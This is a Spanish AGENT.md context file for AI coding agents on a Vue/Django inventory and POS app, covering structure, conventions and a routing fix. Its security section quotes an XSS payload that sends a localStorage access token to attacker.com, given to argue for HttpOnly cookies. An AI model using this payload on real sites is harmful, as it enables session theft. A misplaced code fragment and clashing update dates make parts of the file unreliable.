---
name: nurax-agent-contexto
description: >
  Documento de contexto para agentes AI (Claude, Copilot, etc.)
---

# 🤖 AGENT.md — Nurax Inventario Frontend

> **Documento de contexto para agentes AI (Claude, Copilot, etc.)**
> 
> Última actualización: **30 de Marzo 2026** — Fix de routing backend y documentación

---

## 📋 Project Overview

**Nombre:** Nurax Inventario  
**Descripción:** Sistema de gestión de inventario, ventas y proveedores para pequeños y medianos negocios (SMBs). Permite control completo de stock, POS (Point of Sale), reportes y administración de usuarios.

**Tipo:** Single-Page Application (SPA) + Backend API  
**Stack Principal:**
- **Frontend:** Vue 3 (Composition API) + TypeScript + Vite + Pinia + Vue Router 4
- **Backend:** Django REST Framework (Python 3.10+)
- **API Base:** `http://localhost:8000/api/v1/` (desde 30-Mar-2026)
- **Comunicación Real-time:** Pusher.js
- **Hosting Imágenes:** Cloudinary
- **Estilos:** TailwindCSS v4 (tokens custom en CSS)
- **Tipografía:** Inter (Google Fonts, unificada 30-Mar-2026)

**Estado:** MVP funcional en desarrollo constante  
**Última sesión:** 30 Marzo 2026 — **Fix crítico de routing + documentación completa**

---

## 🚨 CRÍTICO: Sesión 30 Marzo 2026 - Backend Routing Fix

### El Problema
Frontend no podía conectarse al backend después de login:
```
POST /api/auth/login/ → ✅ 200 OK (tokens recibidos)
GET /api/v1/accounts/users/me/ → ❌ 404 Not Found (ruta no existía)
```

### La Causa
Django no tenía el prefijo `/v1/` registrado en `urls.py`:
```python
# ❌ ANTES
urlpatterns = [
    path('api/', include('api.urls'))  # Generaba /api/users/ (SIN /v1/)
]

# ✅ AHORA
urlpatterns = [
    path('api/v1/', include('api.urls'))  # Genera /api/v1/accounts/users/
]
```

### Punto Clave
**Django DRF Router concatena automáticamente:** `path()` + `register()` => ruta final

Si el prefijo es incorrecto en `path()`, TODAS las rutas quedarán mal.

### Solución Implementada
1. ✅ Actualizado `nurax_backend/urls.py`: `path('api/',` → `path('api/v1/',`
2. ✅ Reorganizado `api/urls.py` por dominio (accounts, products, sales, expenses, inventory)
3. ✅ Reiniciado backend: `docker-compose restart api`
4. ✅ Verificado: Todos los endpoints ahora retornan **200 OK** con `/api/v1/` prefix

**Resultado:**
```
✅ GET /api/v1/accounts/users/me/            → 200 (perfil del usuario)
✅ GET /api/v1/products/products/            → 200 (lista de productos)
✅ GET /api/v1/sales/sales/                  → 200 (ventas)
✅ GET /api/v1/expenses/cash-shifts/         → 200 (turnos)
```

---

## 📚 Documentation Created/Updated

| Archivo | Tipo | Propósito |
|---------|------|----------|
| [BACKEND_TROUBLESHOOTING.md](./BACKEND_TROUBLESHOOTING.md) | NEW | Guía para resolver errores backend (routing, migrations, auth) |
| [FRONTEND_TROUBLESHOOTING.md](./FRONTEND_TROUBLESHOOTING.md) | NEW | Guía para resolver errores frontend (404, CORS, auth, fonts) |
| [PROJECT_STATUS.md](./PROJECT_STATUS.md) | UPDATED | Sesión fix documentada con análisis de causa raíz |
| [FRONTEND_PRODUCTS_API_GUIDE.md](./FRONTEND_PRODUCTS_API_GUIDE.md) | UPDATED | Endpoints actualizados a `/api/v1/products/products/` |
| [SKILL.md](./SKILL.md) | REFERENCE | Stack técnico (no cambió, solo para referencia) |
| [PUSHER_EVENTS_CONTEXT.md](./PUSHER_EVENTS_CONTEXT.md) | REFERENCE | Eventos real-time (no cambió) |

---

## 🏗️ Arquitectura

### Repositorio Actual
```
nurax_inventario/
├── docs/                              # Documentación
│   ├── README.md                      # Índice central
│   └── skills/                        # Guías de referencia para IA
│       ├── SKILL.md                   # Stack + estructura detallada
│       ├── PROJECT_STATUS.md          # Estado del proyecto
│       ├── PUSHER_EVENTS_CONTEXT.md   # Eventos en tiempo real
│       └── FRONTEND_PRODUCTS_API_GUIDE.md  # API de productos
│
├── public/                            # Activos estáticos
│   ├── images/
│   └── sounds/
│
├── src/                               # Código fuente principal
│   ├── App.vue                        # Raíz (RouterView + Layout global)
│   ├── main.ts                        # Bootstrap Vue + Pinia + Router
│   ├── style.css                      # Design tokens globales (¡CRÍTICO!)
│   │
│   ├── views/                         # Una vista por ruta (lazy-loaded)
│   │   ├── LandingPage.vue            # "/" - Página pública
│   │   ├── Login.vue                  # "/auth/login" - Autenticación
│   │   ├── Inventory.vue              # "/dashboard/inventory" - Principal
│   │   ├── SalesHistory.vue           # "/dashboard/sales" - Historial de ventas
│   │   ├── Suppliers.vue              # "/dashboard/suppliers" - CRUD proveedores
│   │   ├── Shifts.vue                 # "/dashboard/shifts" - Corte de caja
│   │   ├── Expenses.vue               # "/dashboard/expenses" - Gastos
│   │   ├── AccountsReceivable.vue     # "/dashboard/receivables" - Por cobrar
│   │   ├── AdminClients.vue           # "/dashboard/clients" - Gestión usuarios (admin)
│   │   └── Settings.vue               # "/dashboard/settings" - Config tienda
│   │
│   ├── components/                    # Componentes reutilizables
│   │   ├── common/                    # Globales (App.vue)
│   │   │   ├── LoadingScreen.vue      # Pantalla de carga post-login
│   │   │   ├── Snackbar.vue           # Toast individual
│   │   │   └── SnackbarContainer.vue  # Cola global de toasts
│   │   │
│   │   ├── layout/                    # Shell del dashboard
│   │   │   ├── DashboardLayout.vue    # Layout principal con sidebar + topbar
│   │   │   └── Sidebar.vue            # Navegación por roles
│   │   │
│   │   ├── dashboard/                 # Componentes de datos
│   │   │   ├── ProductTable.vue       # Tabla con filtros y paginación
│   │   │   ├── ProductCardGrid.vue    # Grid alternativo de productos
│   │   │   └── StatsCard.vue          # Tarjetas estadísticas
│   │   │
│   │   ├── ui/                        # Design System (base)
│   │   │   ├── AppButton.vue          # Botón variantes
│   │   │   ├── AppInput.vue           # Input con validación
│   │   │   ├── AppSkeleton.vue        # Skeleton loading
│   │   │   ├── Badge.vue              # Badge/pill
│   │   │   ├── Pagination.vue         # Paginación
│   │   │   ├── ConfirmationModal.vue  # Modal genérico
│   │   │   └── ...otros              # Otros componentes base
│   │   │
│   │   ├── onboarding/                # Wizard de onboarding
│   │   │   ├── OnboardingWizard.vue
│   │   │   ├── OnboardingStep1/2/3.vue
│   │   │   ├── ExcelPreview.vue
│   │   │   ├── StepIndicator.vue
│   │   │   └── ...
│   │   │
│   │   └── (raíz)                     # Modales de negocio
│   │       ├── AddProductModal.vue    # Crear producto
│   │       ├── EditProductModal.vue   # Editar producto
│   │       ├── AddSupplierModal.vue   # Crear proveedor
│   │       ├── DeleteConfirmModal.vue # Confirmación borrado
│   │       ├── SalesModal.vue         # Venta rápida (POS)
│   │       ├── SaleSuccessModal.vue   # Recibo venta
│   │       ├── BarcodeScanner.vue     # Escáner código barras
│   │       ├── InventoryReceiptModal.vue
│   │       ├── KardexModal.vue        # Movimientos de producto
│   │       ├── RestockModal.vue       # Restocking
│   │       ├── NotificationPanel.vue  # Alertas de stock
│   │       ├── FirstProductModal.vue  # Guía primer producto
│   │       ├── ImageCropperModal.vue  # Cortador de imágenes
│   │       ├── OpenShiftModal.vue     # Abrir turno
│   │       └── ProductDetail.vue      # Detalle producto
│   │
│   ├── composables/                   # Logic hooks (Vue Composition API)
│   │   ├── useAuth.ts                 # ⭐ Autenticación principal
│   │   ├── useSnackbar.ts             # Notificaciones globales
│   │   ├── useLoadingScreen.ts        # Control LoadingScreen
│   │   ├── useStoreSettings.ts        # Config tienda (singleton)
│   │   ├── useProducts.ts             # Lógica productos (si existe)
│   │   └── useSuppliers.ts            # CRUD proveedores
│   │
│   ├── services/                      # Capa HTTP (sin estado)
│   │   ├── api.ts                     # ⭐ ApiClient base
│   │   ├── auth.service.ts            # Endpoints autenticación
│   │   ├── products.service.ts        # CRUD productos
│   │   ├── sales.service.ts           # CRUD ventas
│   │   ├── suppliers.service.ts       # CRUD proveedores
│   │   ├── shifts.service.ts          # Gestión turnos
│   │   ├── expenses.service.ts        # Gestión gastos
│   │   ├── store-settings.service.ts  # Config tienda
│   │   └── onboarding.service.ts      # Wizard onboarding
│   │
│   ├── stores/                        # Estado global (Pinia)
│   │   ├── product.store.ts           # ⭐ Productos
│   │   ├── sales.store.ts             # ⭐ Ventas
│   │   ├── shifts.store.ts            # Turnos
│   │   ├── expenses.store.ts          # Gastos
│   │   └── onboarding.store.ts        # Estado onboarding
│   │
│   ├── router/
│   │   └── index.ts                   # Rutas + guards
│   │
│   ├── utils/
│   │   ├── onboarding.schemas.ts      # Validaciones Zod
│   │   ├── ticketBuilder.ts           # Generador de tickets/recibos
│   │   └── ...otros                  # Helpers, formatters
│   │
│   ├── styles/
│   │   └── onboarding.css             # Estilos específicos onboarding
│   │
│   └── assets/                        # Procesados por Vite
│
├── dev-dist/                          # Build para dev (PWA)
├── package.json                       # Dependencias frontend
├── tsconfig.json                      # Config TypeScript
├── tsconfig.app.json                  # Config TS específico app
├── tsconfig.node.json                 # Config TS para Vite
├── vite.config.ts                     # Config Vite
├── AGENT.md                           # Este archivo
├── SKILL.md                           # (Movido a docs/skills/)
└── .env.example                       # Template variables entorno
```

---

## 🎯 Componentes/Módulos Principales

### **Frontend Principal** → `/src`
- **Purpose:** SPA de inventario con 10 vistas, 40+ componentes, estado global con Pinia
- **Tecnologías:** Vue 3, TypeScript, Vite, TailwindCSS 4, Pinia, Vue Router 4, Fetch API
- **Archivos clave:**
  - `src/main.ts` — Bootstrap
  - `src/App.vue` — Raíz con RouterView y layout global
  - `src/style.css` — **Design tokens CRÍTICOS**
  - `src/router/index.ts` — Rutas + guards de autenticación
  - `src/stores/*.store.ts` — Estado global (Pinia)
  - `src/services/api.ts` — **Interceptor JWT + refresh token**

### **API Backend** → (No en este repo, pero importante)
- **Purpose:** Django REST API que sirve datos de negocio
- **Base URL:** `VITE_API_BASE_URL` (default: `http://localhost:8000/api`)
- **Auth:** JWT (access + refresh tokens)
- **Endpoints principales:**
  - POST `/auth/login/` → Obtiene tokens
  - GET `/users/me/` → Perfil actual
  - CRUD `/products/`, `/suppliers/`, `/sales/`, `/shifts/`, `/expenses/`
  - GET `/store/` → Config tienda
  - WebSocket/Pusher → Eventos en tiempo real

### **Documentación IA** → `/docs/skills/`
- **Purpose:** Contexto de referencia para agentes
- **Archivos:**
  - `SKILL.md` → Stack, componentes, reglas
  - `PROJECT_STATUS.md` → Features completadas, bugs, roadmap
  - `PUSHER_EVENTS_CONTEXT.md` → Eventos real-time (INVENTORY_UPDATED, SALES_COMPLETED, etc.)
  - `FRONTEND_PRODUCTS_API_GUIDE.md` → Paginación, filtros, búsqueda

---

## 🛠️ Build & Development Commands

### **Instalación Inicial**
```bash
# Instalar dependencias
npm install

# Configurar variables de entorno (ver .env.example)
cp .env.example .env.local
# Editar .env.local con valores reales (VITE_API_BASE_URL, etc.)
```

### **Desarrollo Local**
```bash
# Dev server con HMR (hot reload)
npm run dev
# Abre: http://localhost:5173

# Dev server con PWA (service worker)
npm run dev:sw
# Útil para probar offline/caching
```

### **Build & Preview**
```bash
# Build para producción
npm run build
# Output: dist/

# Preview build localmente
npm run preview
# Abre: http://localhost:4173
```

### **Validación & Quality**
```bash
# Type checking con TypeScript
npm run type-check
# (Puede no existir, verificar en package.json)

# Linting (si existe)
npm run lint

# Build types solo
tsc --noEmit
```

### **Otros Commands**
```bash
# Ver estructura de módulos
npm run build -- --analyze
# (Si tienes plugin de análisis configurado)
```

> **⚠️ NOTA:** Algunos scripts podrían variar. Verificar `package.json` exácta.

---

## 🔑 Key Technologies

### **Frontend Stack**
| Tecnología | Versión | Propósito |
|-----------|---------|----------|
| **Vue** | 3 | Framework SPA |
| **TypeScript** | 5.x | Type safety |
| **Vite** | 5.x | Build tool |
| **Pinia** | 2.x | State management |
| **Vue Router** | 4.x | Routing |
| **TailwindCSS** | 4.x | Utility-first CSS |
| **Heroicons** | 24 | Icon library |
| **SheetJS (xlsx)** | - | Excel import/export |
| **AOS** | - | Animations (Landing/Login) |
| **Fetch API** | Native | HTTP requests |
| **Pusher JS** | - | Real-time events |

### **Backend Stack** (referencia)
| Tecnología | Propósito |
|-----------|----------|
| Django REST Framework | API REST |
| JWT (djangorestframework-simplejwt) | Autenticación |
| Pusher REST | Eventos real-time |
| Cloudinary SDK | Hosting de imágenes |
| Django ORM | Persistencia |
| PostgreSQL | Base de datos |

### **Infrastructure**
| Servicio | Propósito |
|---------|----------|
| Cloudinary | Hosting de imágenes de productos |
| Pusher | Real-time sync (multi-tab, multi-dispositivo) |
| JWT | Autenticación stateless |

---

## ⚙️ Environment Configuration

### **.env.local** (crear desde `.env.example`)

```env
# API Backend
VITE_API_BASE_URL=http://localhost:8000/api

# (Opcional) Configuración de Pusher si está en frontend
VITE_PUSHER_KEY=xxx
VITE_PUSHER_CLUSTER=xxx

# (Opcional) Analytics, etc.
VITE_ANALYTICS_ID=xxx
```

### **Cómo configura la app variables de entorno**

```typescript
// En src/services/api.ts:
const API_BASE = import.meta.env.VITE_API_BASE_URL ?? 'http://localhost:8000/api'

// En componentes:
const pusherKey = import.meta.env.VITE_PUSHER_KEY
```

### **LocalStorage**
```typescript
// Tokens JWT almacenados:
localStorage.setItem('access_token', 'eyJ...')    // Access token JWT
localStorage.setItem('refresh_token', 'eyJ...')   // Refresh token

// En src/services/api.ts:
const token = localStorage.getItem('access_token')
// Token se inyecta automáticamente en headers Authorization
```

---

## 🌐 Puertos Principales

| Aplicación | Puerto | Descripción |
|-----------|--------|-----------|
| **Frontend (Vite)** | `5173` | Dev server con HMR |
| **Frontend (Preview)** | `4173` | Build preview |
| **Backend Django** | `8000` | API REST |
| **Backend Debug** | `8001` | Si usas debugger |
| **Database (PostgreSQL)** | `5432` | (local o remoto) |
| **Pusher** | (Cloud) | WebSocket real-time |

> **Para desarrollo:** Necesitas Backend corriendo en puerto `8000`.

---

## 🎯 Domain Context (Conceptos Negocio)

### **Roles de Usuario**
| Rol | Acceso | Permisos |
|-----|--------|---------|
| **cliente** | Dashboard completo | Inventario, Ventas, Proveedores, Gastos, Turnos, Confg tienda |
| **admin** | Panel administrativo | Gestión de usuarios/clientes, reportes globales |

### **Flujos de Negocio Principales**

#### 1. **Onboarding** (Primer uso)
```
Usuario nuevo → 3 pasos wizard:
  1. Registro / Login
  2. Info tienda (nombre, moneda, etc.)
  3. Importar productos (Excel o manual)
→ Redirige a Inventory dashboard
```

#### 2. **Administración de Inventario**
```
Dashboard Inventory → CRUD Productos
  - Crear: AddProductModal (nombre, SKU, stock, precio, proveedor, imagen)
  - Editar: EditProductModal
  - Ver: ProductTable con búsqueda, filtros, paginación
  - Asociar: Proveedores desde selector
```

#### 3. **Punto de Venta (POS)**
```
SalesModal → Agregar productos a carrito → Escanear codes/seleccionar
  → Aplicar descuentos (opcional)
  → Procesar pago
  → Recibo (SaleSuccessModal)
  → Evento Pusher SALES_COMPLETED → Actualizar inventario
```

#### 4. **Cierre de Turno (Cash Shift)**
```
OpenShiftModal → Registrar monto inicial
  → Durante turno: Registrar ventas + gastos
  → Cerrar turno:
    Fórmula: starting_cash + total_sales - total_expenses = expected_cash
    Comparar con cash real → Diferencia
```

#### 5. **Reportes & Históricos**
```
SalesHistory → Gráfico semanal + tabla de ventas
Suppliers → Listado de proveedores
Expenses → Listado de gastos por categoría
```

### **Conceptos Clave**

- **SKU**: Identificador único de producto (ej: SKU-0001)
- **Stock Levels**: low_stock (≤10), in_stock (>10), out_of_stock (0)
- **Turnos**: Período de operación con monto inicial/final y caja calculada
- **Sincronización Multi-tab**: Pusher notifica inventario actualizado
- **JWT Refresh**: Auto-renovación silenciosa en 401s (no molesta usuario)

---

## 🔐 Test Credentials

### **Usuario Demo (Cliente Normal)**
| Campo | Valor |
|-------|-------|
| Email | `cliente@example.com` |
| Contraseña | `password123` |
| Rol | `cliente` |
| Acceso | Inventario, Ventas, Proveedores, Turnos, Gastos |

### **Usuario Admin (Gestor)**
| Campo | Valor |
|-------|-------|
| Email | `admin@example.com` |
| Contraseña | `adminpass123` |
| Rol | `admin` |
| Acceso | Panel de clientes, reportes globales |

> ⚠️ **NOTA:** Estas credenciales son de **EJEMPLO**. Backend debe proporcionar usuarios reales.

### **Seeding de Datos (Backend)**
Backend debe proporcionar seed script:
```bash
python manage.py seed_demo_data
# Crea usuarios, productos, proveedores, ventas de ejemplo
```

---

## 📝 Convenciones de Código

### **Estructura de Componentes Vue**
```vue
<template>
  <!-- HTML + directivas Vue (v-if, v-for, etc.) -->
</template>

<script setup lang="ts">
// Composition API con TypeScript
// Imports, refs, computed, watch, lifecycle

import { ref, computed } from 'vue'
import { useSnackbar } from '@/composables'

const count = ref(0)
const doubled = computed(() => count.value * 2)
</script>

<style scoped>
/* CSS Scoped — NO afecta otros componentes */
.button {
  /* SIEMPRE usar tokens CSS, no hardcodear colores */
  background: var(--color-brand-main);
}
</style>
```

### **Nombres de Archivos**
- **Componentes:** PascalCase (`ProductTable.vue`, `AddProductModal.vue`)
- **Composables:** camelCase con prefijo `use` (`useAuth.ts`, `useSnackbar.ts`)
- **Stores:** camelCase con sufijo `.store.ts` (`product.store.ts`, `sales.store.ts`)
- **Services:** camelCase con sufijo `.service.ts` (`auth.service.ts`)
- **Vistas:** PascalCase (`Inventory.vue`, `SalesHistory.vue`)

### **Imports**
```typescript
// ✅ Usar alias (configurado en vite.config.ts)
import { useAuth } from '@/composables/useAuth'
import { AppButton } from '@/components/ui'
import { productStore } from '@/stores'

// ❌ Evitar rutas relativas en imports principales
import useAuth from '../../../composables/useAuth'
```

### **Design Tokens (¡CRÍTICO!)**

**Todos los colores y espacios deben venir de `src/style.css`:**

```css
/* Marca */
--color-brand-main: #227d52
--color-brand-secondary: #06402B

/* Estados */
--color-status-success: #22c55e
--color-status-warning: #f97316
--color-status-danger: #ef4444

/* En componentes Vue: */
.button {
  background: var(--color-brand-main);  /* ✅ Correcto */
}
```

### **Linting & Formatting**
- **Linter:** (Verificar si existe ESLint en proyecto)
- **Formatter:** (Verificar Prettier config)
- **Type Check:** `npm run type-check` o `tsc --noEmit`

---

## 🚫 Reglas Importantes (¡NO ROMPER!)

1. **No crear nuevos stores** sin revisar `product.store.ts` y `sales.store.ts` primero
2. **No usar fetch directo** — sempre pasar por `api.ts` (inyecta JWT automático)
3. **No hardcodear colores** — usar `style.css` tokens
4. **No crear inputs/botones HTML** — usar `AppInput`, `AppButton` del design system
5. **No crear rutas privadas** sin guard de autenticación en `router/index.ts`
6. **El rol `admin` SÓ VE `/dashboard/clients`** — no tiene acceso a inventory/sales
7. **Imágenes de productos** → `FormData` con campo `image_file` → backend sube a Cloudinary
8. **Composable `useAuth` es singleton** — se inyecta una sola vez por aplicación

---

## 🔄 Patrones Clave

### **Autenticación**
```typescript
// composables/useAuth.ts — ÚNICO punto de auth
const { currentUser, isAuthenticated, login, logout, initSession } = useAuth()

// Guard en router:
// await initSession() si no está autenticado → redirige a /auth/login
```

### **Estado Global (Pinia)**
```typescript
// stores/product.store.ts
import { defineStore } from 'pinia'

export const useProductStore = defineStore('product', () => {
  const products = ref([])
  
  const fetch = async () => {
    // Llamar a services/products.service.ts
  }
  
  return { products, fetch }
})

// En componentes:
import { useProductStore } from '@/stores'
const store = useProductStore()
await store.fetch()
```

### **Notificaciones (Snackbar)**
```typescript
const { enqueueSnackbar } = useSnackbar()

enqueueSnackbar({
  type: 'success',
  title: 'Éxito',
  message: 'Producto creado',
  duration: 3000
})
```

### **Eventos Real-time (Pusher)**
```typescript
// Listener cuando venta se completa en otra pestaña:
channel.bind('SALES_COMPLETED', (data) => {
  clearCart()
  await fetchProducts()
  enqueueSnackbar({ type: 'success', message: 'Venta sincronizada' })
})
```

### **Validación de Formularios**
```typescript
// utils/onboarding.schemas.ts usa Zod
```

---

## 🔐 CIBERSEGURIDAD: Experticia del Agente IA

### 🚨 Capacidades de Seguridad Informática

**Este agente cuenta con experticia CRÍTICA en ciberseguridad web y puede:**

- ✅ **Identificar vulnerabilidades de seguridad** en autenticación, almacenamiento de datos, y transporte
- ✅ **Prevenir ataques críticos:** XSS (Cross-Site Scripting), CSRF (Cross-Site Request Forgery), token theft, session hijacking
- ✅ **Implementar soluciones de seguridad** basadas en OWASP y estándares de industria
- ✅ **Auditar código** para detectar fatalidades en seguridad informática
- ✅ **Recomendar mejores prácticas** de autenticación, criptografía y protección de datos sensibles
- ✅ **Evaluar riesgos** de seguridad en arquitecturas web modernas

### 🚨 VULNERABILIDAD CRÍTICA IDENTIFICADA: localStorage + XSS

**ESTADO ACTUAL:** ❌ INSEGURO

```typescript
// ❌ PROBLEMA ACTUAL EN nurax_inventario:
localStorage.setItem('access_token', token)      // ← VULNERABLE A XSS
localStorage.setItem('refresh_token', token)    // ← ROBO DE TOKEN

// Escenario de ataque:
// 1. XSS inyectado: <img onerror="fetch('https://attacker.com?t='+localStorage.getItem('access_token'))">
// 2. Token robado → Atacante impersona usuario completamente
// 3. Acceso a: inventario, ventas, clientes, datos confidenciales
```

**IMPACTO:**
- 🔴 **CRÍTICA:** Robo de identidad de usuario
- 🔴 **CRÍTICA:** Acceso no autorizado a datos de negocio
- 🔴 **CRÍTICA:** Manipulación de inventario y ventas
- 🔴 **CRÍTICA:** Exfiltración de datos de clientes

### ✅ SOLUCIÓN RECOMENDADA: HttpOnly + Secure Cookies

**Estado:** RECOMENDADO para implementación urgente

```http
Set-Cookie: access_token=eyJhbGci...; 
  HttpOnly;           /* ← NO accesible desde JavaScript */
  Secure;             /* ← Solo HTTPS */
  SameSite=Strict;    /* ← Previene CSRF */
  Max-Age=3600;       /* ← 1 hora de expiración */
  Path=/api;
```

**Ventajas:**
- ✅ Token NO accesible desde JavaScript (inmune a XSS)
- ✅ Enviado automáticamente por navegador (conveniencia)
- ✅ Protección contra CSRF con SameSite
- ✅ Expiración controlada por servidor
- ✅ Requiere HTTPS (Secure flag)

**Documentación Completa:** Ver [AUTH_SECURITY_BEST_PRACTICES.md](./AUTH_SECURITY_BEST_PRACTICES.md)
- Análisis detallado de vulnerabilidades
- Implementación backend (Django)
- Implementación frontend (Vue)
- Checklist de seguridad
- Pruebas de validación

### 🔄 Flujo Seguro Esperado (Post-Implementación)

```
1. LOGIN (Usuario)
   ├─ POST /auth/login { email, password }
   └─ Backend: Set-Cookie: access_token (HttpOnly)

2. REQUESTS AUTOMÁTICOS
   ├─ Frontend NO toca el token (está en cookie)
   ├─ Browser envía cookie automáticamente
   └─ Backend valida JWT en cookie

3. REFRESH AUTOMÁTICO (si 401)
   ├─ Backend genera nuevo access_token
   ├─ Set-Cookie: access_token (nuevo)
   └─ Original request reintentada

4. LOGOUT
   ├─ Backend: Set-Cookie: access_token; Max-Age=0;
   └─ Cookie expirada inmediatamente
```

### 📋 Próximos Pasos

**Fase 1 (Backend - Django):** 
- [ ] Crear `auth_utils.py` con `login_with_cookies()`
- [ ] Actualizar `AuthenticationBackend` → `CookieJWTAuthentication`
- [ ] Configurar settings.py (CSRF, SESSION, SECURE flags)

**Fase 2 (Frontend - Vue):**
- [ ] Actualizar `api.ts` → `credentials: 'include'`
- [ ] Remover localStorage token handling
- [ ] Simplificar `useAuth.ts`

**Fase 3 (Validación):**
- [ ] Verificar localStorage vacío
- [ ] Testear HttpOnly en DevTools
- [ ] Testear XSS injection → verificar que NO se roba token
- [ ] Load testing

---

⚠️ **NOTA CRÍTICA:** Este cambio es URGENTE para la seguridad de datos de usuarios y negocio.
import { z } from 'zod'

const ProductSchema = z.object({
  name: z.string().min(3),
  price: z.number().positive(),
  stock: z.number().int().nonnegative()
})

const result = ProductSchema.safeParse(formData)
if (!result.success) {
  // Mostrar errores
}
```

---

## 📂 Estructura a Recordar (Unique Patterns)

### **DashboardLayout es envolvente automático**
```vue
<!-- Inventory.vue (y otras vistas) -->
<template>
  <DashboardLayout>
    <!-- Contenido aquí se renderiza dentro del layout -->
    <ProductTable />
  </DashboardLayout>
</template>
```
→ El layout agrega sidebar, topbar, modales globales automáticamente.

### **Componentes UI son obligatorios**
```vue
<!-- ❌ NUNCA hacer: -->
<button class="px-4 py-2 bg-blue">Guardar</button>

<!-- ✅ SIEMPRE usar: -->
<AppButton variant="fill" @click="save">Guardar</AppButton>
```

### **Stores ♦ Servicios**
- **Stores (Pinia):** Estado reactive + lógica de negocio
- **Services:** Solo HTTP calls (sin estado)
  
```typescript
// services/products.service.ts — SIN estado
export const fetchProducts = async (filters) => {
  return await apiClient.get('/products/', { params: filters })
}

// stores/product.store.ts — CON estado
const products = ref([])
const fetch = async (filters) => {
  products.value = await fetchProducts(filters)
}
```

---

## 📌 Archivos Críticos a Mantener en Mente

| Archivo | Propósito | ❗ Crítico? |
|---------|----------|----------|
| `src/main.ts` | Bootstrap Vue + Pinia + Router | ✅ MUY |
| `src/style.css` | Design tokens (colores, espacios) | ✅ MUY |
| `src/services/api.ts` | Interceptor JWT + refresh automátic | ✅ MUY |
| `src/router/index.ts` | Rutas + guard autenticación | ✅ MUY |
| `src/App.vue` | Raíz: RouterView + LoadingScreen | ✅ ALTA |
| `src/composables/useAuth.ts` | Singleton de autenticación | ✅ ALTA |
| `src/components/layout/DashboardLayout.vue` | Layout principal | ✅ ALTA |
| `package.json` | Scripts + dependencias | ✅ ALTA |
| `vite.config.ts` | Configuración build | ⚠️ MEDIA |
| `tsconfig.json` | Configuración TypeScript + alias | ⚠️ MEDIA |
| `.env.example` | Template variables (⚠️ NO COMITEAR .env) | ⚠️ MEDIA |

---

## 🧪 Testing (Si Implementado)

```bash
# Tests unitarios (si usa Jest/Vitest)
npm run test

# Coverage
npm run test:coverage

# Tests E2E (si usa Cypress/Playwright)
npm run test:e2e
```

---

## 📚 Referencias Rápidas

**Para Agentes AI — Consultar primero:**
1. **Estructura general:** `/docs/skills/SKILL.md`
2. **Estado proyecto:** `/docs/skills/PROJECT_STATUS.md`
3. **API productos:** `/docs/skills/FRONTEND_PRODUCTS_API_GUIDE.md`
4. **Eventos Pusher:** `/docs/skills/PUSHER_EVENTS_CONTEXT.md`

**Archivos source clave:**
- `src/main.ts` — Bootstrap
- `src/router/index.ts` — Rutas + guards
- `src/services/api.ts` — HTTP setup
- `src/style.css` — Design tokens

---

## 🚀 Quick Start para Nuevos Agentes

```bash
# 1. Instalar dependencias
npm install

# 2. Configurar entorno
cp .env.example .env.local
# Editar VITE_API_BASE_URL, etc.

# 3. Iniciar dev server
npm run dev
# http://localhost:5173

# 4. Login
# Email: cliente@example.com | Pass: password123

# 5. Explorar vistas (Inventory, Sales, Suppliers, etc.)
```

---

## 📞 Contacto / Soporte

- **Documentación IA:** `/docs/skills/`
- **Estado proyecto:** `/docs/skills/PROJECT_STATUS.md` (actualizar cada sesión)
- **Backend docs:** (En repo backend)
- **Issues:** GitHub Issues (si disponible)

---

**Última modificación:** 23 Marzo 2026  
**Generado para:** Agentes AI (Claude, Copilot, etc.)
